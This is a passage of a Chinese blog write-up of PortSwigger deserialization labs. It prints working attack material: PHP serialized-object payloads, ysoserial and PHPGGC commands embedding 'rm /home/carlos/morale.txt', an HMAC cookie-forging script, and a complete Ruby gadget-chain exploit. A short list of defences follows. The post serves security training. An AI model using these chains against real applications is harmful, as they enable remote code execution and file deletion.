+<li>题目要求我们作为 wiener 的情况下，删除 carlos 在 &#x2F;home&#x2F;carlos 目录下的 morale.txt 文件。</li>
+</ul>
+<p>先抓包，把 Cookie 拿出来分析一下，发现有个 “avatar_link” 的模块，因为我们要删除 &#x2F;home&#x2F;carlos&#x2F;morale.txt 这一路径的 “morale.txt” 文件，所以 payload 如下，这里不要忘记修改 s 的值，因为它代表了长度。</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"User"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:8:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"wiener"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"access_token"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token string">"t28geo7k62c64bycybe8yq8h93lzvdmi"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"avatar_link"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"/home/carlos/morale.txt"</span>
+</code></pre>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/SuccHorizontal.png" class="">
+
+<h3 id="4-利用魔术方法进行反序列化攻击"><a href="#4-利用魔术方法进行反序列化攻击" class="headerlink" title="4. 利用魔术方法进行反序列化攻击"></a>4. 利用魔术方法进行反序列化攻击</h3><ul>
+<li>魔术方法的定义，魔术方法是方法的特殊子集，一般情况下不会出现的，但每当发生特定事件或方案时，都会被自动调用。</li>
+</ul>
+<p>我帮大家理出一下 PHP，Java，Python 都有哪些魔法函数</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#类的构造函数  </span>
+<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#类的析构函数  </span>
+<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#在对象中调用一个不可访问方法时调用  </span>
+<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#用静态方式中调用一个不可访问方法时调用  </span>
+<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#获得一个类的成员变量时调用  </span>
+<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#设置一个类的成员变量时调用  </span>
+<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#当对不可访问属性调用isset()或empty()时调用  </span>
+<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#当对不可访问属性调用unset()时被调用。  </span>
+<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#执行serialize()时，先会调用这个函数  </span>
+<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#执行unserialize()时，先会调用这个函数  </span>
+<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#类被当成字符串时的回应方法  </span>
+<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#调用函数的方式调用一个对象时的回应方法  </span>
+<span class="token function">__set_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#调用var_export()导出类时，此静态方法会被调用。  </span>
+<span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#当对象复制完成时调用  </span>
+<span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#尝试加载未定义的类  </span>
+<span class="token function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#打印所需调试信息</span>
+</code></pre>
+<p>不同的魔法函数都可以构造对应的不安全的反序列化，但是攻击者构造 POC 的前提是获得到了后端判断的源代码，进行代码审计，从而设计 POC，否则将难以攻击。</p>
+<ul>
+<li>下面是一道简单的 PHP 魔法函数的代码审计。</li>
+</ul>
+<blockquote>
+<h5 id="Lab-Arbitrary-object-injection-in-PHP"><a href="#Lab-Arbitrary-object-injection-in-PHP" class="headerlink" title="Lab: Arbitrary object injection in PHP"></a>Lab: Arbitrary object injection in PHP</h5></blockquote>
+<ul>
+<li>题目要求我们删除 &#x2F;home&#x2F;carlos&#x2F;morale.txt 这一文件</li>
+</ul>
+<p>进入靶场，因为这道题需要源代码的代码审计，在 Burpsuite 的 Sitemap 中发现了一个静态资源 <code>/libs/CustomTemplate.php</code>。如果直接在 Web 下打开这一接口，返回的页面是空。</p>
+<ul>
+<li>尝试 <code>/libs/CustomTemplate.php~</code>，在 PHP 中，结尾带有 <code>~</code>，很可能是备份文件。访问成功，把源码拉下来。</li>
+</ul>
+<p>在后面看到有 PHP 的魔法函数 ———— <code>__construct()</code> 与 <code>__destruct()</code>，感觉可以利用。毕竟是代码审计嘛，我们把两个魔法函数拉出来审计一下。</p>
+<ul>
+<li><code>__construct</code> 函数进行了简单赋值的工作<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$template_file_path</span><span class="token punctuation">)</span> 
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+ <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">template_file_path</span> <span class="token operator">=</span> <span class="token variable">$template_file_path</span><span class="token punctuation">;</span>
+ <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lock_file_path</span> <span class="token operator">=</span> <span class="token variable">$template_file_path</span> <span class="token punctuation">.</span> <span class="token string">".lock"</span><span class="token punctuation">;</span>
+ <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+</li>
+<li><code>__destruct()</code> 中的 <code>unlink</code> 函数用于删除文件，这里给我们提供了攻击思路，只需要我们修改 <code>lock_file_path</code> 为 <code>/home/carlos/morale.txt</code> 文件即可进行攻击。</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+ <span class="token comment" spellcheck="true">// Carlos thought this would be a good idea</span>
+ <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lock_file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+ <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+ <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lock_file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+ <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<p>先使用 Port 提供给我们的 <code>wiener</code> 与 <code>peter</code> 登录，再对 Accout 界面进行抓包，将 <code>lock_file_path</code> 修改为 <code>/home/carlos/morale.txt</code> </p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHPMagicalBag.png" class="">
+
+<p>将 Session 值放入 Decoder 模块，并修改为如下</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"CustomTemplate"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">"lock_file_path"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"/home/carlos/morale.txt"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Base64Magic.png" class="">
+
+<p>将我们编写好的 payload 进行编码，替换 Session；发包即可。</p>
+<h3 id="5-Gadget-Chain-一些反序列化构造的工具"><a href="#5-Gadget-Chain-一些反序列化构造的工具" class="headerlink" title="5. Gadget Chain 一些反序列化构造的工具"></a>5. Gadget Chain 一些反序列化构造的工具</h3><ul>
+<li>这一块主要是 <strong>Gadget Chain</strong> 这一概念，之前自己学习的时候也是概念不清楚，卡了一会儿。</li>
+</ul>
+<p>Gadget Chain 其实就是我们所说的通用 payload，在我们输入要任意执行的命令 ———— 例如 <code>whoami</code>,<code>ipconfig</code> 等命令时，Gadget Chain 会帮我们进行自动编码，减轻负担。</p>
+<p>Java反序列化的一个这样的工具是 “ysoserial”。我们在使用它的时候先选择对应的框架，然后传入要执行的命令。</p>
+<p>然后，它基于所选链创建适当的序列化对象，当然有一定的精准度，但是可以提高我们的渗透效率。</p>
+<ul>
+<li>我个人把它理解为黑盒测试，不断尝试 payload。</li>
+<li>这里 Port 向我们介绍了一样工具 ————<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"> ysoserial</a>，用来进行反序列化的构造。</li>
+</ul>
+<h4 id="1-使用-ysoserial-构造-payload"><a href="#1-使用-ysoserial-构造-payload" class="headerlink" title="(1) 使用 ysoserial 构造 payload"></a>(1) 使用 ysoserial 构造 payload</h4><blockquote>
+<h5 id="Lab-Exploiting-Java-deserialization-with-Apache-Commons"><a href="#Lab-Exploiting-Java-deserialization-with-Apache-Commons" class="headerlink" title="Lab: Exploiting Java deserialization with Apache Commons"></a>Lab: Exploiting Java deserialization with Apache Commons</h5></blockquote>
+<p>Port 已经告诉我们问题是 Commons Collections 链，所以我们可以直接构造 payload，设置参数为 Commons Collections 即可；但转念一想，若我们不知道框架当中的问题是 Commons Collections，便可以通过黑盒测试逐个尝试。</p>
+<p>日常登录后抓包，并对 Accout 界面进行 Session 构造 payload。<br><strong>使用 ysoserial</strong> 来构造 payload</p>
+<pre class=" language-bash"><code class="language-bash">java -jar path/to/ysoserial.jar CommonsCollections4 <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64
+</code></pre>
+<ul>
+<li>注意一点：ysoserial 只能用于 Java 8 版本及一下，要不然会报错的</li>
+</ul>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ysoserial.png" class="">
+
+<p>接着将这一串 base64 码进行 url 编码</p>
+<p>再替换 Session；至于 CC 链的构造，之后学习 Java 代码审计的部分会细讲。Port 这部分还是注重漏洞挖掘为主。</p>
+<h4 id="2-使用-PHPGGC-构造-payload"><a href="#2-使用-PHPGGC-构造-payload" class="headerlink" title="(2) 使用 PHPGGC 构造 payload"></a>(2) 使用 PHPGGC 构造 payload</h4><p>下载地址 <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">PHPGGC</a>。用法和 ysoserial 类似，也是输入对应的框架，比如 PHP Symfony 4.3.6，Symfony 3.3 等。</p>
+<p>一般的思路都是先去找到该 Web 界面用的是何种框架，再针对框架进行攻击。</p>
+<blockquote>
+<h5 id="Lab-Exploiting-PHP-deserialization-with-a-pre-built-gadget-chain"><a href="#Lab-Exploiting-PHP-deserialization-with-a-pre-built-gadget-chain" class="headerlink" title="Lab: Exploiting PHP deserialization with a pre-built gadget chain"></a>Lab: Exploiting PHP deserialization with a pre-built gadget chain</h5></blockquote>
+<ul>
+<li>题意：删除 &#x2F;home&#x2F;carlos&#x2F;marale.txt 文件</li>
+</ul>
+<p>先将 Cookie 解码，url的方式，发现了可控的参数</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/URLDecode.png" class="">
+
+<p>进入靶场，我们先输入接口 <code>/cgi-bin/phpinfo.php</code>，这个接口表明了 PHP 的信息。并获取到了一个 Secret_KEY。</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHPGGCsecret_key.png" class="">
+
+<p>接着我们抓包，并修改 Cookie 使其报错。我们探测出 PHP Symfon Version 为 4.3.6.</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ErrorPHPVersion.png" class="">
+
+<p>接着，我们切换到 PHPGGC 这一工具下，使用命令探测 PHPGGC 构造 Payload 的版本。</p>
+<pre class=" language-bash"><code class="language-bash">./phpggc -i symfony/rce4
+</code></pre>
+<ul>
+<li>通过命令构造 Payload</li>
+</ul>
+<pre class=" language-bash"><code class="language-bash">./phpggc Symfony/RCE4 <span class="token function">exec</span> <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64
+</code></pre>
+<p>现在我们需要构造一个 Cookie，Cookie 的构造需要我们的 Base64 编码加上一个 Secret_Key，算法如下；这里生成的 Base64 编码需要把换行全部去掉。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string">"PHPGGC中生成的base64字符串"</span><span class="token punctuation">;</span>
+<span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string">"yprtgexgp1wu7vwejr6s1khql8g9wv7r"</span><span class="token punctuation">;</span>
+<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string">'&amp;#123;"token":"'</span> <span class="token punctuation">.</span> <span class="token variable">$object</span> <span class="token punctuation">.</span> <span class="token string">'","sig_hmac_sha1":"'</span> <span class="token punctuation">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'"&amp;#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span>
+</code></pre>
+<p>生成的码：</p>
+<pre class=" language-none"><code class="language-none">%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22917bd6977b88bb1b1580dd46345c125219d284d0%22%7D
+</code></pre>
+<p>用此替换 Cookie，发包即可。不用将 <code>sig_hmac_sha1</code> 替换掉。</p>
+<h4 id="3-使用-ruby-deserialization-构造-payload"><a href="#3-使用-ruby-deserialization-构造-payload" class="headerlink" title="(3) 使用 ruby-deserialization 构造 payload"></a>(3) 使用 ruby-deserialization 构造 payload</h4><ul>
+<li>针对 Ruby 进行反序列化 payload 的制作。</li>
+</ul>
+<p>RUBY 2.X 通用 RCE 反序列化小工具链</p>
+<p><a target="_blank" rel="noopener" href="https://www.elttam.com/blog/ruby-deserialization/#content">https://www.elttam.com/blog/ruby-deserialization/#content</a></p>
+<p>先安装 Ruby 环境，为 EXP 做准备；这里我是用 Debian10 的。安装比较简单</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ruby-full
+
+ // 安装完毕后输入，检测输入
+ ruby -v 
+</code></pre>
+<p>Ruby 用来攻击的 Payload</p>
+<pre class=" language-ruby"><code class="language-ruby"><span class="token comment" spellcheck="true">#!/usr/bin/env ruby  </span>
+​  
+<span class="token keyword">class</span> <span class="token class-name">Gem</span><span class="token punctuation">:</span><span class="token symbol">:StubSpecification</span>  
+<span class="token keyword">def</span> initialize<span class="token punctuation">;</span> <span class="token keyword">end</span>  
+<span class="token keyword">end</span>  
+​  
+​  
+stub_specification <span class="token operator">=</span> <span class="token constant">Gem</span><span class="token punctuation">:</span><span class="token symbol">:StubSpecification</span><span class="token punctuation">.</span><span class="token keyword">new</span>  
+<span class="token class-name">stub_specification<span class="token punctuation">.</span>instance_variable_set</span><span class="token punctuation">(</span><span class="token punctuation">:</span><span class="token variable">@loaded_from</span><span class="token punctuation">,</span> <span class="token string">"|id 1>&amp;2"</span><span class="token punctuation">)</span>  
+​  
+puts <span class="token string">"STEP n"</span>  
+stub_specification<span class="token punctuation">.</span>name <span class="token keyword">rescue</span> <span class="token keyword">nil</span>  
+puts  
+​  
+​  
+<span class="token keyword">class</span> <span class="token class-name">Gem</span><span class="token punctuation">:</span><span class="token symbol">:Source</span><span class="token punctuation">:</span><span class="token symbol">:SpecificFile</span>  
+<span class="token keyword">def</span> initialize<span class="token punctuation">;</span> <span class="token keyword">end</span>  
+<span class="token keyword">end</span>  
+​  
+specific_file <span class="token operator">=</span> <span class="token constant">Gem</span><span class="token punctuation">:</span><span class="token symbol">:Source</span><span class="token punctuation">:</span><span class="token symbol">:SpecificFile</span><span class="token punctuation">.</span><span class="token keyword">new</span>  
+<span class="token class-name">specific_file<span class="token punctuation">.</span>instance_variable_set</span><span class="token punctuation">(</span><span class="token punctuation">:</span><span class="token variable">@spec</span><span class="token punctuation">,</span> stub_specification<span class="token punctuation">)</span>  
+​  
+other_specific_file <span class="token operator">=</span> <span class="token constant">Gem</span><span class="token punctuation">:</span><span class="token symbol">:Source</span><span class="token punctuation">:</span><span class="token symbol">:SpecificFile</span><span class="token punctuation">.</span><span class="token keyword">new</span>  
+​  
+puts <span class="token string">"STEP n-1"</span>  
+specific_file <span class="token operator">&lt;=</span><span class="token operator">></span> other_specific_file <span class="token keyword">rescue</span> <span class="token keyword">nil</span>  
+puts  
+​  
+​  
+<span class="token variable">$dependency_list</span><span class="token operator">=</span> <span class="token constant">Gem</span><span class="token punctuation">:</span><span class="token symbol">:DependencyList</span><span class="token punctuation">.</span><span class="token keyword">new</span>  
+<span class="token variable">$dependency_list</span><span class="token punctuation">.</span><span class="token function">instance_variable_set</span><span class="token punctuation">(</span><span class="token punctuation">:</span><span class="token variable">@specs</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>specific_file<span class="token punctuation">,</span> other_specific_file<span class="token punctuation">]</span><span class="token punctuation">)</span>  
+​  
+puts <span class="token string">"STEP n-2"</span>  
+<span class="token variable">$dependency_list</span><span class="token punctuation">.</span><span class="token keyword">each</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125; rescue nil  </span>
+puts  
+​  
+​  
+<span class="token keyword">class</span> <span class="token class-name">Gem</span><span class="token punctuation">:</span><span class="token symbol">:Requirement</span>  
+<span class="token keyword">def</span> marshal_dump  
+<span class="token punctuation">[</span><span class="token variable">$dependency_list</span><span class="token punctuation">]</span>  
+<span class="token keyword">end</span>  
+<span class="token keyword">end</span>  
+​  
+payload <span class="token operator">=</span> <span class="token constant">Marshal</span><span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token constant">Gem</span><span class="token punctuation">:</span><span class="token symbol">:Requirement</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span>  
+​  
+puts <span class="token string">"STEP n-3"</span>  
+<span class="token constant">Marshal</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token keyword">rescue</span> <span class="token keyword">nil</span>  
+puts  
+​  
+​  
+puts <span class="token string">"VALIDATION (in fresh ruby process):"</span>  
+<span class="token builtin">IO</span><span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">"ruby -e 'Marshal.load(STDIN.read) rescue nil'"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>pipe<span class="token operator">|</span>  
+pipe<span class="token punctuation">.</span>print payload  
+pipe<span class="token punctuation">.</span>close_write  
+puts pipe<span class="token punctuation">.</span>gets  
+puts  
+<span class="token keyword">end</span>  
+​  
+puts <span class="token string">"Payload (hex):"</span>  
+puts payload<span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'H*'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  
+puts  
+​  
+​  
+<span class="token keyword">require</span> <span class="token string">"base64"</span>  
+puts <span class="token string">"Payload (Base64 encoded):"</span>  
+puts <span class="token constant">Base64</span><span class="token punctuation">.</span><span class="token function">encode64</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+</code></pre>
+<ul>
+<li>在此处修改我们需要构造的 Payload 进行攻击。</li>
+</ul>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RubyChange.png" class="">
+
+
+<blockquote>
+<h5 id="Lab-Exploiting-Ruby-deserialization-using-a-documented-gadget-chain"><a href="#Lab-Exploiting-Ruby-deserialization-using-a-documented-gadget-chain" class="headerlink" title="Lab: Exploiting Ruby deserialization using a documented gadget chain"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain">Lab: Exploiting Ruby deserialization using a documented gadget chain</a></h5></blockquote>
+<p>接着，我们将 Ruby 中的那段程序用 <code>rm /home/carlos/morale.txt</code> 进行替换，再运行程序。</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RubyEXP.png" class="">
+
+<p>抓包，将这段 base64 的编码进行 url 编码；将其替换 cookie。</p>
+<ul>
+<li>还有一部分的代码审计打算学完代码审计再来看，要不然感觉没什么意义。</li>
+</ul>
+<h2 id="0x04-反序列化的防御"><a href="#0x04-反序列化的防御" class="headerlink" title="0x04 反序列化的防御"></a>0x04 反序列化的防御</h2><ol>
+<li>一般来说，避免用户输入的数据反序列化。</li>
+<li>确保反序列化的输入不被用户可控。</li>
+<li>常对框架打补丁</li>
+</ol>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Drun1baby</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://drun1baby.github.io/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://drun1baby.github.io/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Drun1baby</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
